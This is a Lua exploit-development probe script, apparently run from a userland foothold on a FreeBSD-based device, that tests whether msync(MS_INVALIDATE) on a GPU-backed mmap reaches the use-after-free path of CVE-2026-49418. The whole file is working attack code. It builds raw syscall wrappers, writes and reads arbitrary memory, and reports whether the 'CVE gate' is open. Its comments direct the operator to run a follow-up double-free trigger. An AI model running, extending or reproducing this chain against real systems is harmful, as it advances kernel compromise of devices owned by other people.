-- CRASH_CLASS: HIGH
-- PROBE 124a: msync(MS_INVALIDATE) on GPU mmap — CVE-2026-49418 GATE TEST
--
-- Context:
--   CVE-2026-49418 (FreeBSD-SA-26:37.vm) is a use-after-free in the device
--   pager page list triggered by msync(MS_INVALIDATE) on device-backed mappings.
--
--   121e proved: msync(65) with MS_SYNC(flags=0) on GPU mmap → rv=0, survives.
--   121g proved: msync(65) with MS_INVALIDATE(flags=2) on dmem → rv=-1 (blocked).
--   UNTESTED: msync(65) with MS_INVALIDATE(flags=2) on GPU mmap.
--
--   GPU mmap (syscall 477, flags 0x1002) creates device-backed pages — exactly
--   the type the CVE targets. If MS_INVALIDATE returns 0 on these pages, the
--   device pager invalidation path is reachable and the double-free is next.
--
-- This probe tests ONLY whether msync(MS_INVALIDATE) returns on GPU mmap.
-- It does NOT attempt the double-free (that is 124b).
--
-- Expected outcomes:
--   rv=0  → CVE PATH IS OPEN. Run 124b immediately.
--   rv=-1 → kernel blocks MS_INVALIDATE on this mapping type. Dead end for CVE.
--   crash → msync(MS_INVALIDATE) is lethal on GPU pages. Dead end for CVE.

print("=== PROBE 124a: GPU MMAP + MSYNC(MS_INVALIDATE) — CVE GATE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function failed(v)
    if type(v) == "table" and v.h == 0xFFFFFFFF then return true end
    return to_num(v) == 0xFFFFFFFF
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    return pcall(function() memory.write_dword(addr, val) end)
end

local sc_mmap   = make_syscall(477)   -- GPU mmap
local sc_msync  = make_syscall(65)    -- msync (CORRECT number — 58a used 226 wrong!)
local sc_getpid = make_syscall(20)
local sc_munmap = make_syscall(73)

local PAGE = 0x4000
local MS_INVALIDATE = 2
local NUM_PAGES = 4
local MAP_SIZE = NUM_PAGES * PAGE

--------------------------------------------------------------------
-- STEP 0: Canary
--------------------------------------------------------------------
local ok0, pid0 = pcall(function() return sc_getpid() end)
print("[0] pid=" .. tostring(to_num(pid0)))
if not ok0 then
    print("STOP: getpid failed")
    print("=== PROBE 124a COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- STEP 1: Create GPU mmap (proven pattern from 41c/121e)
--------------------------------------------------------------------
print("")
print("[1] Creating GPU mmap: " .. NUM_PAGES .. " pages (" .. MAP_SIZE .. " bytes)")
local ok_map, base = pcall(function()
    return sc_mmap(
        uint64(0),
        uint64(MAP_SIZE),
        uint64(0x33),                      -- PROT_READ | PROT_WRITE | 0x30
        uint64(0x1002),                    -- MAP_SHARED | MAP_ANON (device-backed)
        uint64("0xFFFFFFFFFFFFFFFF"),       -- fd = -1
        uint64(0)
    )
end)
print("[1] mmap ok=" .. tostring(ok_map) .. " base=" .. hex(base))
if not ok_map or failed(base) or to_num(base) == 0 then
    print("STOP: GPU mmap failed")
    print("=== PROBE 124a COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- STEP 2: Baseline — write patterns to all pages, verify readable
--------------------------------------------------------------------
print("")
print("[2] Writing patterns to " .. NUM_PAGES .. " pages...")
local write_ok = 0
local read_ok = 0
for i = 0, NUM_PAGES - 1 do
    local addr = base + (i * PAGE)
    local marker = 0xCAFE0000 + i
    if safe_wd(to_num(addr), marker) then
        write_ok = write_ok + 1
    end
    local v = safe_rd(to_num(addr))
    if v == marker then
        read_ok = read_ok + 1
    end
end
print("[2] write_ok=" .. write_ok .. "/" .. NUM_PAGES
    .. " read_ok=" .. read_ok .. "/" .. NUM_PAGES)
if write_ok ~= NUM_PAGES or read_ok ~= NUM_PAGES then
    print("STOP: page R/W baseline failed")
    print("=== PROBE 124a COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- STEP 3: Canary before the critical call
--------------------------------------------------------------------
local ok1, pid1 = pcall(function() return sc_getpid() end)
print("")
print("[3] pre-msync canary pid=" .. tostring(to_num(pid1)))

--------------------------------------------------------------------
-- STEP 4: THE CRITICAL CALL — msync(MS_INVALIDATE) on GPU mmap
--------------------------------------------------------------------
print("")
print("[BEFORE] msync(65) MS_INVALIDATE on GPU mmap base=" .. hex(base)
    .. " len=" .. MAP_SIZE)
local ok_ms, rv_ms = pcall(function()
    return sc_msync(base, uint64(MAP_SIZE), uint64(MS_INVALIDATE))
end)
print("[AFTER] ok=" .. tostring(ok_ms) .. " rv=" .. tostring(rv_ms))

if not ok_ms then
    print("[!] msync pcall FAILED — call crashed/threw")
    local ok2, pid2 = pcall(function() return sc_getpid() end)
    print("[!] post-crash canary: ok=" .. tostring(ok2) .. " pid=" .. tostring(pid2))
    print("=== PROBE 124a COMPLETE ===")
    return
end

local rv_num = to_num(rv_ms)
print("[4] rv_num=" .. rv_num .. " hex=" .. hex(rv_ms))

if failed(rv_ms) then
    print("[4] msync(MS_INVALIDATE) RETURNED -1 — BLOCKED on GPU mmap")
    print("[4] CVE-2026-49418 gate: CLOSED")
else
    print("[4] msync(MS_INVALIDATE) RETURNED " .. rv_num .. " — NOT BLOCKED!")
    print("[4] *** CVE-2026-49418 gate: OPEN ***")
end

--------------------------------------------------------------------
-- STEP 5: Post-invalidate — can we still read the pages?
--------------------------------------------------------------------
print("")
print("[5] Post-invalidate page read check:")
local post_read = 0
local post_values = {}
for i = 0, NUM_PAGES - 1 do
    local addr = base + (i * PAGE)
    local v = safe_rd(to_num(addr))
    if v then
        post_read = post_read + 1
        post_values[i] = v
    else
        post_values[i] = "FAULT"
    end
end
print("[5] readable=" .. post_read .. "/" .. NUM_PAGES)
for i = 0, NUM_PAGES - 1 do
    local expected = 0xCAFE0000 + i
    local got = post_values[i]
    local match = ""
    if type(got) == "number" then
        match = (got == expected) and "MATCH" or "CHANGED"
    else
        match = "FAULT"
    end
    print("  page " .. i .. ": " .. tostring(got)
        .. " (expected 0x" .. string.format("%X", expected) .. ") " .. match)
end

--------------------------------------------------------------------
-- STEP 6: Post-invalidate write — does page fault re-insert?
--------------------------------------------------------------------
print("")
print("[6] Post-invalidate write test (triggers page fault = re-insertion):")
local rewrite_ok = 0
for i = 0, NUM_PAGES - 1 do
    local addr = base + (i * PAGE)
    if safe_wd(to_num(addr), 0xBEEF0000 + i) then
        rewrite_ok = rewrite_ok + 1
    end
end
print("[6] rewrite_ok=" .. rewrite_ok .. "/" .. NUM_PAGES)

-- Read back after re-insertion
local reread_ok = 0
for i = 0, NUM_PAGES - 1 do
    local addr = base + (i * PAGE)
    local v = safe_rd(to_num(addr))
    if v == (0xBEEF0000 + i) then
        reread_ok = reread_ok + 1
    end
end
print("[6] reread_match=" .. reread_ok .. "/" .. NUM_PAGES)

--------------------------------------------------------------------
-- STEP 7: Final canary
--------------------------------------------------------------------
print("")
local ok3, pid3 = pcall(function() return sc_getpid() end)
print("[7] final canary: ok=" .. tostring(ok3) .. " pid=" .. tostring(to_num(pid3)))

if not failed(rv_ms) and rv_num == 0 then
    print("")
    print("*** CVE-2026-49418 GATE IS OPEN ***")
    print("*** msync(MS_INVALIDATE) succeeded on device-backed GPU mmap ***")
    print("*** Run 124b for double-free trigger ***")
end

print("=== PROBE 124a COMPLETE ===")
